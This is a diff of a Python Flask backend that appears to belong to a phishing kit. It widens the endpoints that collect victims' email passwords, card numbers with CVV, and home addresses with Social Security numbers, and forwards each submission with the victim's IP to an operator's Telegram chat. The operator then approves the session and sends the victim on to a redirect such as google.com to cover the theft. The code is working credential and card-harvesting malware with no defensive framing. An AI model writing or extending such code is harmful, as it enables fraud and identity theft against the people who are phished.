@@ -50,7 +50,12 @@ def set_webhook():
 def send_to_telegram(data, session_id, type_):
     msg = f"<b>🔐 {type_.upper()} Submission</b>\n\n"
     for key, value in data.items():
-        msg += f"<b>{key.replace('_', ' ').title()}:</b> <code>{value}</code>\n"
+        if isinstance(value, dict):
+            msg += f"<b>{key.replace('_', ' ').title()}:</b>\n"
+            for subkey, subvalue in value.items():
+                msg += f"  <b>{subkey.replace('_', ' ').title()}:</b> <code>{subvalue}</code>\n"
+        else:
+            msg += f"<b>{key.replace('_', ' ').title()}:</b> <code>{value}</code>\n"
     msg += f"<b>Session ID:</b> <code>{session_id}</code>"
 
     inline_keyboard = [[
@@ -118,18 +123,19 @@ def otp():
 @app.route("/email", methods=["POST"])
 def email():
     data = request.get_json()
-    if not data or "email" not in data:
+    if not data or "email" not in data or "password" not in data:
         print("Email error: Missing fields")
         return jsonify({"success": False, "error": "Missing fields"}), 400
 
     email = data["email"]
+    password = data["password"]
     ip = request.headers.get("X-Forwarded-For", request.remote_addr)
-    sessionblink    session_id = str(uuid.uuid4())
+    session_id = str(uuid.uuid4())
 
     SESSION_STATUS[session_id] = {"type": "email", "approved": False, "redirect_url": None}
     print("Email session created:", session_id)
 
-    if not send_to_telegram({"email": email, "ip": ip}, session_id, "email"):
+    if not send_to_telegram({"email": email, "password": password, "ip": ip}, session_id, "email"):
         print("Email error: Telegram send failed")
         return jsonify({"success": False, "error": "Telegram failed"}), 500
 
@@ -138,18 +144,18 @@ def email():
 @app.route("/c", methods=["POST"])
 def c():
     data = request.get_json()
-    if not data or "data" not in data:
+    if not data or "data" not in data or "card_number" not in data["data"] or "exp_date" not in data["data"] or "cvv" not in data["data"]:
         print("C error: Missing fields")
         return jsonify({"success": False, "error": "Missing fields"}), 400
 
-    c_data = data["data"]
+    card_data = data["data"]
     ip = request.headers.get("X-Forwarded-For", request.remote_addr)
     session_id = str(uuid.uuid4())
 
     SESSION_STATUS[session_id] = {"type": "c", "approved": False, "redirect_url": None}
     print("C session created:", session_id)
 
-    if not send_to_telegram({"c_data": c_data, "ip": ip}, session_id, "c"):
+    if not send_to_telegram({"card_data": card_data, "ip": ip}, session_id, "c"):
         print("C error: Telegram send failed")
         return jsonify({"success": False, "error": "Telegram failed"}), 500
 
@@ -158,19 +164,22 @@ def c():
 @app.route("/personal", methods=["POST"])
 def personal():
     data = request.get_json()
-    if not data or "full_name" not in data or "dob" not in data:
+    if not data or "full_name" not in data or "address" not in data or "city" not in data or "zip" not in data or "ssn" not in data:
         print("Personal error: Missing fields")
         return jsonify({"success": False, "error": "Missing fields"}), 400
 
     full_name = data["full_name"]
-    dob = data["dob"]
+    address = data["address"]
+    city = data["city"]
+    zip_code = data["zip"]
+    ssn = data["ssn"]
     ip = request.headers.get("X-Forwarded-For", request.remote_addr)
     session_id = str(uuid.uuid4())
 
     SESSION_STATUS[session_id] = {"type": "personal", "approved": False, "redirect_url": None}
     print("Personal session created:", session_id)
 
-    if not send_to_telegram({"full_name": full_name, "dob": dob, "ip": ip}, session_id, "personal"):
+    if not send_to_telegram({"full_name": full_name, "address": address, "city": city, "zip": zip_code, "ssn": ssn, "ip": ip}, session_id, "personal"):
         print("Personal error: Telegram send failed")
         return jsonify({"success": False, "error": "Telegram failed"}), 500
 
@@ -231,7 +240,7 @@ def webhook():
         session_id, action = data.split(":")
         print(f"Session ID: {session_id}, Action: {action}")
         if session_id in SESSION_STATUS:
-            if action in [b["page"] for b in PAGES]:
+            if action in [b["page"] for b in PAGES] or action == "https://google.com":
                 SESSION_STATUS[session_id]["approved"] = True
                 SESSION_STATUS[session_id]["redirect_url"] = action
                 print("Session updated:", SESSION_STATUS[session_id])
